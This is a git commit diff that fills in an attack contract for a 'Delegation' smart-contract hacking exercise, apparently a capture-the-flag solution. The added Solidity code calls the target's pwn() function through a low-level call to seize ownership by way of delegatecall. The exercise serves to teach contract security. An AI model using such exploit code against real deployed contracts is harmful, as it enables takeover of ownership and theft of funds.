7508e62ec9db73f200776fe349dbcc3f03276d40
Gabriel <gabriel@gabrielhorvat.com>
2022-07-03 22:51:13 +0200

    delegation

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -2,14 +2,18 @@
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
 
+
 contract AttackingDelegation {
     address public contractAddress;
-
+    Delegate delegate;
+    string functionName;
     constructor(address _contractAddress) {
-        contractAddress = _contractAddress;
+    delegate = Delegate(_contractAddress);
+    functionName = "pwn()";
     }
 
     function hackContract() external {
-        // Code me!
+    (bool result,) = address(delegate).call(abi.encodeWithSignature("pwn()"));
+    require(result);
     }
 }
